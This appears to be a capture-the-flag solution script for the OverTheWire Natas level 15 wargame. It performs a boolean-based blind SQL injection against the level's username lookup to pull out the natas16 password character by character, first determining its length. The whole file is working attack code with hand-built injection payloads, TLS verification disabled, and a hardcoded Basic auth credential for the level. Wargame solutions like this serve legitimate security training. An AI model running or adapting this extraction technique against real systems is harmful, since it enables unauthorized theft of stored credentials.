import requests
import urllib3
import sys
from string import ascii_lowercase, ascii_uppercase

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# SEND ALL TRAFFIC THROUGH THE PROXY, BURP PROXY IN THIS CASE
proxies = {'http' : 'http://127.0.0.1:8080', 'https' : 'http://127.0.0.1:8080'}

# FUNCTION TO DETERMINE THE LENGTH OF THE PASSWORD
def find_psw_length(username, index_url, auth):
    for i in range(0, 100):
        payload = index_url+'?username={0}"+AND+(SELECT+username+FROM+users+WHERE+username="{0}"+and+LENGTH(password)={1})="{0}"--+&debug=true'.format(username, i)
        sys.stdout.write("[+] Testing length... {0}\r".format(i))
        sys.stdout.flush()
        sys.stdout.write("\033[k")
        r = requests.get(payload, headers=auth, proxies=proxies, verify=False)
        if "This user exists." in r.text:
            print("\n[+] Password length is %i" % i)
            return i
    # If max value is out of range    
    print("\n[-] Could not determine the password length")
    sys.exit(-1)

# FUNCTION TO DETERMINE THE ACTUAL PASSWORD
def enumerate_psw(index_url, username, auth, password_length):
    # Create a string with all possible characters the password may include
    chars = ascii_lowercase+ascii_uppercase+"0123456789"
    # Initialize the password variable to be empty
    password = ""
    # For every index (position) test if the characters is correct
    for i in range(1, password_length+1):
        for j in chars:
            payload = index_url+'?username={0}"+AND+(SELECT+SUBSTRING(BINARY+password,{1},1)+FROM+users+WHERE+username="{0}")="{2}"--+&debug=true'.format(username, i, j)
            r = requests.get(payload, headers=auth, proxies=proxies, verify=False)
            # If it is correct, update the variable password and break the execution to skip over to the next index
            if "This user exists." in r.text:
                password = password + j
                break
            sys.stdout.write("[+] Password: {0}{1}\r".format(password, j))
            sys.stdout.flush()
            sys.stdout.write("\033[k")
    if password:
        return password
    else:
        print("\n[-] Something went wrong!")


def main():
    # If the wrong number of argument is supplied, print error message
    if len(sys.argv) != 2:
        print("[-] Usage: %s url" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1].strip()
    index_url = url + '/index.php'
    
    # Authorization header
    auth = {
        'Authorization' : 'Basic bmF0YXMxNTpUVGthSTdBV0c0aURFUnp0QmNFeUtWN2tSWEgxRVpSQg=='
    }

    username = 'natas16'
    print("[+] Let's find out the password length")
    password_length = find_psw_length(username, index_url, auth)
    
    if password_length:
        print("[+] Let's proceed and identify the password's characters")
    
    password = enumerate_psw(index_url, username, auth, password_length)
    print("[+] The password is %s" % password)

if __name__ == "__main__":
    main()